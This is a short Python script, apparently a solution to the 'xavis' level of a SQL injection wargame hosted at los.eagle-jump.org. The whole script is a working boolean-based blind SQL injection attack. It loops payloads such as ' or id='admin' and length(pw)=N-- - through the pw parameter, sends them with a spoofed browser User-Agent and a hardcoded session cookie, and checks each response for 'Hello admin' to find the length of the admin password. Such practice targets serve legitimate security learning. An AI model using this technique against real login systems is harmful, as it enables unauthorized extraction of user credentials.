import urllib.request
from urllib.parse import quote

i=1

while i:
    url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
    data = "' or id='admin' and length(pw)={}-- -".format(i)
    print (data)
    data = quote(data)
###########################################################################################################################################################
    re = urllib.request.Request(url + data)
    re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
    re.add_header("Cookie", "PHPSESSID=vt2ho6kvcu0hjgehmdmuj37qd1")
    res = urllib.request.urlopen(re)
###########################################################################################################################################################
    if  str(res.read()).find("Hello admin") != -1:
            print(i)
            break
    i+=1
###########################################################################################################################################################